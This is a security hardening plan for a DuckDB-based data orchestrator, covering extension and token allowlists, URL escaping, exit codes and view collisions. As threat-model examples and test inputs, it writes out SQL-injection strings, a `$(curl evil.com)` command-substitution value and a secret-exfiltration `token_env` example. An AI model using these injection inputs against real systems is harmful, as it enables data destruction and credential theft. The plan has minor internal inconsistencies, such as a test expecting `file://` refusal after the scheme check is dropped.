# Plan: harden the connector → orchestrator trust boundary (issue #81)

> **Status:** proposal — open for review.
> **Issue:** [#81](../../../issues/81) — `[SECURITY][CRITICAL] Harden the connector → orchestrator trust boundary`.
> **Owner:** TBD.
> **Target:** three reviewable PRs landing in this order. Group A is the security blocker; B and C can ship independently.

## 1. Why this exists

The `extract.duckdb` contract treats every connector as a trusted producer. The orchestrator
ingests metadata that the connector wrote — `_meta`, `_remote_attach`, view definitions —
and uses those values as inputs to `INSTALL`, `LOAD`, and `ATTACH` SQL on the **shared**
`analytics.duckdb`. A connector that lies (compromised image, supply-chain attack, malicious
fork dropped into `/data/extracts/`, or simply a buggy implementation) can today:

1. **Install arbitrary DuckDB community extensions** — there is no allowlist of which
   extensions are acceptable. `INSTALL <ext> FROM community` runs whatever the connector
   asks for as long as the name matches `_SAFE_IDENTIFIER`. Source: `src/orchestrator.py:242`.
2. **Exfiltrate environment secrets** — the orchestrator reads `token_env` (an env-var
   *name* the connector writes to `_remote_attach`) and uses `os.environ.get(token_env)`
   as the auth token in `ATTACH`. Setting `token_env = "SESSION_SECRET"` (or any other
   secret in the runtime env) sends it to the connector-controlled URL. Source:
   `src/orchestrator.py:224-225`.
3. **Inject SQL via the URL** — the URL passed to `ATTACH` is not single-quote escaped.
   A connector can write `https://x'); DROP DATABASE …; --` and break out of the literal.
   Source: `src/orchestrator.py:246, 251`.

These are the **C1** findings from the audit. They are unmitigated in the
`SyncOrchestrator.rebuild()` path (the read-only query path in `src/db.py:405` already
implements the safer pattern as a side note — it `LOAD`s without `INSTALL` and escapes the
URL with `safe_url = url.replace("'", "''")`).

The audit also identified two non-CRITICAL but real issues:

4. **M14 — silent partial-failure exit** — `connectors/keboola/extractor.py:258` exits 0
   when 9 of 10 tables fail. The orchestrator's downstream `rebuild()` then publishes
   stale views as if everything is fine. Operators have no signal.
5. **View-name collisions across connectors** — `src/orchestrator.py:188` creates each
   view in the master DB under a flat namespace (`"{table_name}"`). Two connectors with
   a table named `users` silently overwrite each other on whichever order `rebuild()`
   visits them. Identifier validation prevents SQL injection (already fixed) but does
   not prevent collision.

## 2. Threat model

In scope:
- Compromised connector image / malicious connector binary in a customer deployment.
- Buggy connector that emits malformed `_remote_attach` rows.
- A connector that an admin drops into `/data/extracts/` without code review.

Out of scope:
- Attacker who already has shell on the orchestrator host (game over).
- Attacker who can write directly to `analytics.duckdb` (game over).
- Operator misconfiguration of `instance.yaml` (separate threat surface, separate fixes).

The implicit guarantee we want to ship: **the orchestrator must not trust a connector with
anything beyond what the connector needs to publish data**. Specifically:
- The orchestrator picks which extensions are acceptable, not the connector.
- The orchestrator picks which env vars a connector may reference, not the connector.
- The orchestrator constructs all SQL identifiers and string literals safely; the
  connector contributes only typed values.

## 3. Group A — close the C1 findings (one PR)

**Branch:** `zs/fix-81-orchestrator-attach-hardening`.
**Target file:** `src/orchestrator.py`, plus a new `src/orchestrator_security.py` for the
allowlist constants so they are easy to audit and to override per deployment.

### A.1 Extension allowlist

Today (`src/orchestrator.py:218-221`):
```python
if not _validate_identifier(extension, "remote_attach extension"):
    continue
```

After:
```python
if extension not in _ALLOWED_EXTENSIONS:
    logger.error(
        "Remote attach %s: extension %r is not in the allowlist (%s); refusing",
        alias, extension, sorted(_ALLOWED_EXTENSIONS),
    )
    continue
```

Initial allowlist (in `orchestrator_security.py`):
```python
_ALLOWED_EXTENSIONS = {
    "keboola",   # community
    "bigquery",  # community
}
```

Operators who need a different extension can override via env var:
`AGNES_REMOTE_ATTACH_EXTENSIONS=keboola,bigquery,custom_thing`. Document this in
`config/.env.template` and `docs/DEPLOYMENT.md`.

**`INSTALL FROM community` is wrong for built-ins.** Reviewer note: `postgres`,
`mysql`, `sqlite` are built-in DuckDB extensions — `INSTALL postgres FROM
community` would fail. The `src/db.py:411` read-only path already handles this
correctly with `LOAD` only. This PR splits the install path into two branches:

```python
if extension in _BUILTIN_EXTENSIONS:        # {"postgres", "mysql", "sqlite", ...}
    conn.execute(f"LOAD {extension};")       # no INSTALL
else:                                        # community
    conn.execute(f"INSTALL {extension} FROM community; LOAD {extension};")
```

Built-ins are not added to the default `_ALLOWED_EXTENSIONS` until a connector
needs them (we currently have no connectors using direct `postgres`/`mysql`/
`sqlite` attaches; if/when one ships, add it via the operator override env or
extend the default).

A future cleanup (separate PR, tracked) is to pre-install community extensions
at image build time so the runtime `INSTALL FROM community` step disappears
entirely. That removes the supply-chain risk on the community registry and is
strictly better than allowlisting at install time.

### A.2 Token-env-var allowlist (hard allowlist, not denylist)

Today (`src/orchestrator.py:224`):
```python
token = os.environ.get(token_env, "") if token_env else ""
```

After:
```python
if token_env and not _is_allowed_token_env(token_env):
    logger.error(
        "Remote attach %s: token_env %r is not allowed; refusing", alias, token_env,
    )
    continue
token = os.environ.get(token_env, "") if token_env else ""
```

**Reviewer correction**: an earlier draft of this plan proposed a structural
`_TOKEN/_API_KEY/_AUTH` suffix rule + denylist of well-known secrets. That is
backwards — it requires future maintainers to remember to denylist every new
runtime secret as it gets added. A hard allowlist is the safer policy.

Allowlist policy:
```python
_DEFAULT_TOKEN_ENVS = {
    "KBC_TOKEN",
    "KBC_STORAGE_TOKEN",
    "KEBOOLA_STORAGE_TOKEN",
    "GOOGLE_APPLICATION_CREDENTIALS",  # path, not a secret value
}
```

Operator override:
```
AGNES_REMOTE_ATTACH_TOKEN_ENVS=KBC_TOKEN,KEBOOLA_STORAGE_TOKEN,MY_CUSTOM_TOKEN
```

The operator override **replaces** the default (not unions with it) so an
operator can shrink the allowlist as well as expand it. Names must additionally
match `^[A-Z][A-Z0-9_]{0,63}$` to refuse anything that wouldn't be a valid env
var (defense against weird input — a malicious connector cannot inject
`token_env = "$(curl evil.com)"` and have that survive the regex even if it
somehow ends up in the allowlist).

The trade-off vs. a structural rule: an operator with a new third-party
service has to add its env-var name to `AGNES_REMOTE_ATTACH_TOKEN_ENVS` once.
That is acceptable friction; the alternative is silent `OPENAI_API_KEY`
exfiltration the day someone adds it for an LLM feature.

### A.3 URL escape (single-quote only, no scheme allowlist)

Today (`src/orchestrator.py:246, 251`):
```python
conn.execute(f"ATTACH '{url}' AS {alias} (TYPE {extension}, TOKEN '{escaped_token}')")
conn.execute(f"ATTACH '{url}' AS {alias} (TYPE {extension}, READ_ONLY)")
```

After (mirror the `src/db.py:411` pattern):
```python
safe_url = url.replace("'", "''")
conn.execute(f"ATTACH '{safe_url}' AS {alias} (TYPE {extension}, TOKEN '{escaped_token}')")
```

**Reviewer correction**: an earlier draft proposed a URL scheme allowlist
(`{"https", "bigquery", …}`). This breaks BigQuery, which uses
`'project=<id>'` as the URL form (no scheme at all — `urlparse(...).scheme == ""`,
see `connectors/bigquery/extractor.py:82`). Different DuckDB extensions use
wildly different URL forms; there is no portable scheme rule.

Decision for this PR: drop the scheme allowlist. The single-quote escape +
extension allowlist + token-env allowlist together close the actual injection
and exfiltration paths. A future enhancement (separate PR, scoped to specific
extensions where it makes sense) could add a `(extension, url-pattern)` matrix
— e.g. for the `keboola` extension assert the URL starts with `https://` since
that extension does use HTTPS — but doing so generally is wrong.

The `file://` concern is real but mitigated by the extension allowlist: an
extension that interprets `file://` URLs (like `httpfs` if added) would have
to be on the allowlist first. The dangerous case is "a connector we trust
silently accepts `file://`"; if that turns out to be true for `keboola` or
`bigquery`, scope the URL form per-extension at that point.

### A.4 Tests

New `tests/test_orchestrator_remote_attach_security.py`. Each test writes a malicious
`_remote_attach` row into a fixture `extract.duckdb`, runs `_attach_remote_extensions`,
and asserts:

- Disallowed extension → not installed; `attached` set unchanged; ERROR log.
- `token_env = "SESSION_SECRET"` → no `ATTACH` call; ERROR log.
- `token_env = "MALICIOUS_TOKEN"` (matches naming convention but absent) → existing
  warning path, no ATTACH.
- URL with embedded single-quote → `ATTACH` succeeds against a captured SQL string
  that contains `''` (double-escaped), proving no injection.
- URL scheme `file://` → refused.
- Happy path (`extension=keboola, token_env=KEBOOLA_STORAGE_TOKEN, https url`) → ATTACH succeeds.

Use a captured-SQL fake `duckdb.Connection` so we can assert the exact strings the
orchestrator builds without needing a real DuckDB extension installed.

### A.5 CHANGELOG

```markdown
### Fixed
- **Security (CRITICAL)**: hardened the connector → orchestrator trust
  boundary (issue #81). Three fixes in
  `src/orchestrator.py::_attach_remote_extensions`:
  (1) DuckDB extensions referenced by `_remote_attach` are now matched
  against a hard allowlist (default: `keboola, bigquery`; override via
  `AGNES_REMOTE_ATTACH_EXTENSIONS`). The install path splits between
  built-in (LOAD only) and community (`INSTALL FROM community; LOAD`).
  (2) `token_env` names are matched against a hard allowlist (default:
  `KBC_TOKEN`, `KBC_STORAGE_TOKEN`, `KEBOOLA_STORAGE_TOKEN`,
  `GOOGLE_APPLICATION_CREDENTIALS`; override via
  `AGNES_REMOTE_ATTACH_TOKEN_ENVS`). Names must additionally match
  `^[A-Z][A-Z0-9_]{0,63}$`. The earlier draft of this plan proposed a
  structural suffix rule + denylist of runtime secrets; that approach was
  abandoned in review because it required maintainers to remember to
  denylist every new secret as it was added — a hard allowlist is safer.
  (3) The URL passed to `ATTACH` is now single-quote-escaped (mirrors
  `src/db.py:411`). No URL-scheme allowlist is enforced because BigQuery
  uses `'project=<id>'` (no scheme); the extension allowlist + token
  allowlist + escape together close the actual injection / exfiltration
  paths.
```

### A.6 Rollout

These are detective changes for almost everyone — connectors in tree (`keboola`,
`bigquery`, `jira`) all comply with the proposed allowlists. Risk: a downstream operator
with a custom connector breaks. Mitigation: prominent ERROR log + the override env vars.

## 4. Group B — fix the silent partial-failure (one small PR)

**Branch:** `zs/fix-81-keboola-partial-failure`.
**Target file:** `connectors/keboola/extractor.py:258`.

### B.1 Behaviour change

```diff
-    failed = result.get("tables_failed", 0)
-    exit(1 if failed == len(tables) else 0)  # exit 1 only if ALL tables failed
+    failed = result.get("tables_failed", 0)
+    succeeded = result.get("tables_succeeded", 0)
+    if failed == 0:
+        exit(0)  # full success
+    elif succeeded == 0:
+        logger.error("All %d tables failed", failed)
+        exit(1)  # full failure
+    else:
+        logger.error("Partial failure: %d of %d tables failed", failed, len(tables))
+        exit(2)  # partial failure — distinct exit code so the scheduler/cron can alert
```

### B.2 Sync API integration (corrected — scheduler does NOT spawn extractors)

**Reviewer correction**: an earlier draft said `services/scheduler/run.py`
treats the exit code. That is wrong. `services/scheduler/__main__.py:62-65`
only POSTs to `/api/sync/trigger` and `/api/health` over HTTP — it never sees
the extractor's exit code. The actual subprocess invocation lives at
`app/api/sync.py:122-135`, which captures `result.returncode` and only logs
it (lines 132-135 — "Extractor FAILED (exit %d)" / "Extractor OK").

The integration point is therefore **`app/api/sync.py`**, not the scheduler:

```python
# app/api/sync.py around line 132-135
if result.returncode == 0:
    sync_state_repo.mark_success(source_name=source, sha=meta_sha, ts=now)
elif result.returncode == 2:
    sync_state_repo.mark_partial(source_name=source, ts=now,
                                  detail=result.stderr[-500:])
    # do NOT advance last_successful_sync_at; do NOT publish updated views
    # for the failed tables; orchestrator.rebuild_source skips them
else:  # 1 or other non-zero
    sync_state_repo.mark_failure(source_name=source, ts=now,
                                  detail=result.stderr[-500:])
```

This requires extending `SyncStateRepository` with a `mark_partial` method and
adding a `partial_failure` value to the `sync_state.status` column's accepted
set. New regression test `test_sync_api_handles_partial_failure_exit_code`.

### B.3 Tests

- `tests/test_keboola_extractor_exit_codes.py` — table-driven over (succeeded, failed)
  pairs: (10, 0)→0, (0, 10)→1, (5, 5)→2, (9, 1)→2.
- Update scheduler test to assert partial-failure surfacing in `sync_history`.

### B.4 CHANGELOG

```markdown
### Changed
- **BREAKING (ops)**: Keboola extractor now uses three exit codes — 0 (full success),
  1 (full failure), 2 (partial failure). Previously, partial failure exited 0 and the
  orchestrator silently published stale views (issue #81 / M14). Operators who treat
  any non-zero exit as a hard error need to teach their alerting that exit 2 is a
  data-quality signal, not a deploy failure.
```

## 5. Group C — view-name collision detection (design + implementation)

**Branch:** `zs/fix-81-view-collision-detection`.
**Target file:** `src/orchestrator.py:188` (view creation), plus a new repository
method on `sync_state` for namespace ownership.

### C.1 Decision needed before coding

Two viable strategies; pick one:

**C.1.a — schema-prefixed views (preferred).** Create views as
`"{source_name}__{table_name}"` (e.g. `keboola__orders`, `bigquery__orders`).
Pros: zero conflict by construction; obvious provenance in queries; matches the
`_meta.source_name` field naturally. Cons: BREAKING — every dashboard / saved query
that hits `orders` directly needs to update. Migration path: keep an unprefixed alias
view for the *first* connector that registers a given name (FCFS), drop after a
deprecation window.

**C.1.b — collision detection + reject (safer near-term).** Keep the flat namespace,
but during `rebuild()`, before creating a view, check if another connector already
owns that name in `view_ownership` (new table). On collision: log ERROR, refuse to
create the colliding view, surface in `sync_state.status = "name_collision"`.
Pros: no migration; existing queries keep working. Cons: the second connector to ship
a colliding name is silently dataless; operator has to rename one side.

**Recommendation.** Start with C.1.b (this PR). Plan C.1.a as a separate v0.12.0
breaking change after we have data on how often collisions actually happen. Both are
strictly better than today's last-write-wins.

### C.2 Implementation sketch (C.1.b)

- Schema migration v10 adds `view_ownership(view_name PK, source_name, registered_at)`.
- `_create_views_from_meta` looks up the existing owner before `CREATE OR REPLACE
  VIEW`. Owner match → proceed. Different owner → log + skip.
- `da admin views` CLI subcommand lists owners and lets an operator transfer
  ownership manually after they have renamed the loser.

### C.3 Tests

- Two extracts with overlapping `_meta.table_name` → first to rebuild wins, second
  fails with ERROR; `sync_state.status` for the second source reflects collision.
- Re-rebuild same source → owner match → no error.

### C.4 CHANGELOG

```markdown
### Added
- **Schema v10** introduces `view_ownership` to detect cross-connector view-name
  collisions (issue #81). When two connectors register the same `_meta.table_name`,
  the second one's view is now refused with an explicit ERROR rather than silently
  overwriting (last-write-wins). Operators inspect ownership via `da admin views`
  and resolve by renaming the connector-side table.
```

## 6. Group D — extractor-side identifier injection (M15, missing from earlier draft)

**Branch:** `zs/fix-81-extractor-identifier-validation`.
**Reviewer correction**: the earlier draft skipped M15 entirely. M15 is the
peer of M15 (the `_meta.table_name` SQLi which `_validate_identifier` already
fixed at the orchestrator level) but at the **extractor** level. Same trust
problem: an attacker who controls `table_registry` (admin or the registry-
write API surface) can inject SQL via identifier interpolation.

### D.1 Affected sites

`connectors/keboola/extractor.py`:
- `:103-105` — bucket / source_table interpolation in CREATE VIEW.
- `:128` — table_name in INSERT INTO _meta.
- `:175-176` — bucket / source_table in COPY TO parquet.

`connectors/bigquery/extractor.py`:
- `:95-96` — dataset / source_table in CREATE OR REPLACE VIEW.

### D.2 Fix

Reuse the already-existing `_validate_identifier` from `src/orchestrator.py`
(lift it to a shared `src/identifier_validation.py`) and gate every
identifier interpolation in both extractors. Refuse the row with an ERROR
log, do not crash the whole extraction.

### D.3 Tests

`tests/test_extractor_identifier_validation.py` — registry rows with
`table_name = "evil\"; DROP …"`, `bucket = "x; --"`, etc. Asserts the
extractor logs ERROR and skips that row but continues processing valid rows
in the same registry.

### D.4 Sequencing

D can ship in parallel with A — they touch different files — but both should
land before the next public release.

## 7. Sequencing

| PR | Branch | Depends on | Ship before |
|---|---|---|---|
| A — orchestrator C1 hardening | `zs/fix-81-orchestrator-attach-hardening` | — | next public release |
| D — extractor identifier validation (M15) | `zs/fix-81-extractor-identifier-validation` | — | next public release |
| B — partial-failure exit | `zs/fix-81-keboola-partial-failure` | — | next minor |
| C — view collisions | `zs/fix-81-view-collision-detection` | A merged (security path clean before feature work in the same file) | next minor |

A and D are blockers for the public OSS release (paired with #88's leak cleanup).
B and C can land any time after.

## 8. Open questions for review (revised)

The original draft asked three questions; reviewer answered or invalidated all
three. Replaced with the questions still genuinely open:

- **Operator override semantics.** `AGNES_REMOTE_ATTACH_EXTENSIONS` and
  `AGNES_REMOTE_ATTACH_TOKEN_ENVS` — should these **replace** the default
  allowlist or **extend** it? This plan says replace (allows shrinking) but
  that means a typo silently disables a working integration. Extend-only is
  safer but couples operators to the default forever. Lean toward replace +
  loud startup log of the effective allowlist so a typo is visible.

- **Group C escape hatch — registry-side aliasing.** Reviewer correctly noted
  that "operator renames one side" is operationally hostile when the source
  side is a vendor (Keboola bucket name). The `table_registry` already has
  `name` (display name) separate from `source_table` (vendor name); the
  collision-reject path can suggest renaming `name` rather than the source
  table. Add this hint to the ERROR message in C.2.

- **Pre-install community extensions at image build.** A.1 keeps runtime
  `INSTALL FROM community`. The cleaner long-term fix is to pre-install at
  build time. Open: do we land that as part of this PR sequence or schedule
  it separately? Build-time install changes the Docker image and CI; if
  we delay it, supply-chain risk on the community registry persists. Lean
  toward separate PR after A lands.

## 9. Confirmed (no longer open)

- ✅ Scheme allowlist on URL — **dropped** (BigQuery has no scheme,
  `connectors/bigquery/extractor.py:82`).
- ✅ INSTALL vs LOAD — **split** by built-in vs community in A.1.
- ✅ Token-env policy — **hard allowlist**, no suffix rule.
- ✅ Schema version for Group C — current is v9 (`src/db.py:19`), so v10 is
  correct. No other in-flight PR is claiming v10.
- ✅ Exit code 2 in Group B — no conflict with other connectors
  (`grep "exit(" connectors/` returns only 0 / 1).
- ✅ Scheduler integration — **not in scheduler**, see B.2 correction.
